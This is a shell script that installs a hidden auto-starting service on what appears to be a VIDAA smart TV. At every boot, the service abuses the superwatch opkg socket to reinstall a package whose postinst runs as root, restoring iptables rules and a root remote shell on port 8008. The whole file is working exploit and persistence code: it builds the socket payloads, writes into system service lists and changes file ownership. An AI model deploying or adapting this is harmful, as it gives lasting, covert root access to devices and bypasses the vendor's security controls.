#!/bin/sh
# deploy_persist.sh — install the boot-persistence service (uid 314) that
# re-arms the root channel after every reboot.
#
# What it does:
#   1. keeps a copy of the installer IPK where the service can find it
#   2. creates services/re_sshd/ with index.js + package.json
#   3. merges the re_sshd entry into serviceList.json (with Node, not text
#      surgery — the 55E7QTUK lane broke the JSON that way)
#   4. fixes the ownership so the uid-314 service manager can read the files
#      and write its boot marker
BB=/usr/local/bin/busybox
S=/APPS/pkgs/tv.vidaa.jsservice.basic/CHA/services
NODE=/APPS/pkgs/tv.vidaa.app.phoenix/CHA/bin/phoenix
D=/APPS/.re_sshd

echo '=== 1. keep the IPK where the service can reach it ==='
mkdir -p $D
if [ -f /APPS/installer.ipk ]; then
    cp -f /APPS/installer.ipk $D/installer.ipk
    echo "copied /APPS/installer.ipk -> $D/installer.ipk"
else
    echo "WARNING: /APPS/installer.ipk missing"
fi
ls -l /APPS/installer.ipk $D/installer.ipk

echo '=== 2. service files ==='
mkdir -p $S/re_sshd

cat > $S/re_sshd/index.js <<'RE_SSHD_INDEX_EOF'
'use strict';
Object.defineProperty(exports, "__esModule", { value: true });
const { BaseService } = require('@sdk/baseService.js');
const net = require('net');
const fs = require('fs');

const D = '/APPS/.re_sshd';
const MARKER = D + '/boot_marker.txt';
const SOCKET = '/var/run/superwatch_socket';
const IPK = '/APPS/.re_sshd/installer.ipk';
/* superwatch opkg protocol, same payloads as the install page:
   90/91 = session ids, 83 = uninstall, 82 = install. The install re-runs the
   postinst as uid 0, which re-inserts the iptables rules (they live in RAM
   only and are gone after a reboot) and restarts the rshell supervisor. */
const PAYLOADS = [
    '90:83:90;re.installer',
    '91:82:91;' + IPK + ';re.installer;'
];

function log(msg) {
    try { fs.appendFileSync(MARKER, new Date().toISOString() + ' ' + msg + '\n'); } catch (e) {}
}

function rshellRunning() {
    try {
        const pids = fs.readdirSync('/proc');
        for (let i = 0; i < pids.length; i++) {
            const p = pids[i];
            if (!/^[0-9]+$/.test(p)) continue;
            try {
                const cmd = fs.readFileSync('/proc/' + p + '/cmdline', 'latin1').replace(/\0/g, ' ');
                if (cmd.indexOf('rshell.js') !== -1) return true;
            } catch (e) {}
        }
    } catch (e) {}
    return false;
}

function sendOne(payload) {
    return new Promise((resolve) => {
        let chunks = [];
        const c = net.createConnection(SOCKET, () => {
            const b = Buffer.from(payload, 'utf8');
            const h = Buffer.alloc(4); h.writeUInt32LE(b.length, 0);
            c.write(Buffer.concat([h, b]));
        });
        c.setTimeout(15000);
        c.on('data', d => chunks.push(d));
        c.on('end', () => resolve(Buffer.concat(chunks).toString('utf8').slice(0, 120)));
        c.on('timeout', () => { c.destroy(); resolve('TIMEOUT'); });
        c.on('error', e => resolve('ERR ' + e.message));
    });
}

async function arm() {
    for (let i = 1; i <= 36; i++) {
        if (rshellRunning()) { log('rshell already running'); return; }
        const r1 = await sendOne(PAYLOADS[0]);
        const r2 = await sendOne(PAYLOADS[1]);
        log('attempt ' + i + ' uninstall=[' + r1 + '] install=[' + r2 + ']');
        await new Promise(r => setTimeout(r, 5000));
        if (rshellRunning()) { log('ARMED: rshell up'); return; }
    }
    log('GAVE UP after 36 attempts');
}

module.exports = class ReSshd extends BaseService {
    constructor(dest) { super(dest); }
    async start() {
        log('re_sshd start pid=' + process.pid + ' uid=' + process.getuid());
        if (rshellRunning()) { log('rshell already running'); return; }
        arm().catch(e => log('arm error: ' + e));
    }
};
RE_SSHD_INDEX_EOF

cat > $S/re_sshd/package.json <<'RE_SSHD_PKG_EOF'
{
  "name": "re_sshd",
  "version": "1.0.0",
  "description": "re-arm the alvidaa root shell (node rshell on 8008) at every boot",
  "main": "index.js",
  "type": "commonjs",
  "selfStart": true,
  "permission": {},
  "author": ""
}
RE_SSHD_PKG_EOF

echo '=== 3. merge serviceList.json (Node, not text surgery) ==='
cp -f $S/serviceList.json $S/serviceList.json.pristine
echo "pristine copy: $S/serviceList.json.pristine"

cat > /tmp/merge_list.js <<'MERGE_EOF'
const fs = require('fs');
const P = '/APPS/pkgs/tv.vidaa.jsservice.basic/CHA/services/serviceList.json';
let list = [];
try { list = JSON.parse(fs.readFileSync(P, 'utf8')); }
catch (e) { console.log('PARSE FAILED: ' + e.message); }
if (!Array.isArray(list)) { console.log('not an array -> aborting'); process.exit(1); }
if (!list.find(e => e.id === 're_sshd')) {
  list.push({ id: 're_sshd', autoStart: true, isKeepAlive: false });
}
fs.writeFileSync(P, JSON.stringify(list, null, 4) + '\n');
const back = JSON.parse(fs.readFileSync(P, 'utf8'));
console.log('merged -> ' + back.length + ' entries, re_sshd present: ' + !!back.find(e => e.id === 're_sshd'));
MERGE_EOF

$NODE /tmp/merge_list.js

echo '=== 4. ownership ==='
chown -R 314:314 $S/re_sshd
chmod 750 $S/re_sshd
chmod 640 $S/re_sshd/index.js $S/re_sshd/package.json
chown 314:314 $S/serviceList.json $S/serviceList.json.pristine
chmod 640 $S/serviceList.json $S/serviceList.json.pristine
touch $D/boot_marker.txt
chown 314:314 $D/boot_marker.txt
chmod 644 $D/boot_marker.txt
: > $D/rshell.log
chown 314:314 $D/rshell.log

echo '=== 5. verify ==='
ls -la $S/re_sshd
echo '--- serviceList.json ---'
$BB cat $S/serviceList.json
echo '--- ownership ---'
ls -la $D
echo '--- JSON validity ---'
cat > /tmp/check_json.js <<'CHECK_EOF'
const fs = require('fs');
const P = '/APPS/pkgs/tv.vidaa.jsservice.basic/CHA/services/serviceList.json';
try {
  const l = JSON.parse(fs.readFileSync(P, 'utf8'));
  console.log('JSON OK, ' + l.length + ' entries: ' + l.map(e => e.id + (e.autoStart ? '*' : '')).join(', '));
} catch (e) { console.log('JSON INVALID: ' + e.message); }
CHECK_EOF
$NODE /tmp/check_json.js
echo '--- index.js parses ---'
cat > /tmp/check_js.js <<'CHECKJS_EOF'
const fs = require('fs');
const vm = require('vm');
try {
  new vm.Script(fs.readFileSync('/APPS/pkgs/tv.vidaa.jsservice.basic/CHA/services/re_sshd/index.js', 'utf8'));
  console.log('index.js parses OK');
} catch (e) { console.log('index.js SYNTAX ERROR: ' + e.message); }
CHECKJS_EOF
$NODE /tmp/check_js.js
echo '=== done ==='
